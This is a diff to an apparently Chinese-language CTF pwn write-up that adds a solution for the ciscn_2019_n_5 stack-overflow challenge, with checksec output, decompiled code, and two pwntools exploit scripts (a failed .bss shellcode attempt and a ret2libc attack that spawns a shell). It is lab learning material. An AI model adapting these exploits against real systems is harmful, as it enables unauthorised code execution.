@@ -537,7 +537,7 @@ flag{3f6ddea2-b817-4c30-87a5-932479cd6e00}
 
 
 
-## get_started_3dsctf_2016
+## get_started_3dsctf_2016(未完成)
 
 
 
@@ -601,4 +601,140 @@ void __cdecl get_flag(int a1, int a2)
 ![image-20241108144759255](../_media/image-20241108144759255.png)
 
 
+
+
+
+
+
+
+
+
+
+## ciscn_2019_n_5
+
+check一下：
+
+```
+helloctfos@Hello-CTF:~/pwnenv$ checksec pwn
+[*] '/home/helloctfos/pwnenv/pwn'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+```
+
+
+
+
+
+一个比较简单的栈溢出：
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char text[30]; // [rsp+0h] [rbp-20h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("tell me your name");
+  read(0, name, 0x64uLL);
+  puts("wow~ nice name!");
+  puts("What do you want to say to me?");
+  gets(text);
+  return 0;
+}
+```
+
+
+
+read 100,name在.bss区，gets没有作出限制，所以可以轻松的溢出，也没有开始保护，有一个RWX的段
+
+
+
+
+
+直接写就是了
+
+
+
+### shellcode法打不通
+
+不知道为什么，检查nx没有开
+
+然后看vmmap
+
+![image-20241121160536937](../_media/image-20241121160536937.png)
+
+
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+from struct import pack
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = 'node5.buuoj.cn'
+port = 25854
+
+r=remote(ip,port)
+
+shellcode=asm(shellcraft.sh())
+
+r.recvuntil('tell me your name')
+
+r.sendline(shellcode)
+
+use_addr = 0x601080
+
+payload=flat(['a'*0x28,use_addr])
+
+r.recvuntil('What do you want to say to me?')
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+
+
+
+
+### libcSearcher
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(os='linux', arch='amd64', log_level='debug')
+ 
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25854)
+elf = ELF('./111')
+ 
+#gdb.attach(p, 'b *0x4006a9')
+plt_addr =elf.sym['puts']
+got_addr =elf.got['puts']
+main_addr =0x400636
+ret_addr =0x4004c9
+rdi_addr =0x400713
+name_addr =0x601080
+ 
+p.sendafter(b'name\n', b'1')
+ 
+payload =b'a'*(0x20 +8) +p64(rdi_addr) +p64(got_addr) +p64(plt_addr) +p64(main_addr)
+p.sendlineafter(b'me?\n', payload)
+ 
+puts_addr =u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+libc =LibcSearcher('puts',puts_addr)
+libc_base =puts_addr -libc.dump('puts')
+system =libc_base + libc.dump('system')
+ 
+p.sendafter(b'name\n', b'/bin/sh\x00')
+payload =b'a'*(0x20 +8) +p64(ret_addr) +p64(rdi_addr) +p64(name_addr) +p64(system)
+ 
+p.sendlineafter(b'me?\n',payload)
+p.interactive()
+```
 
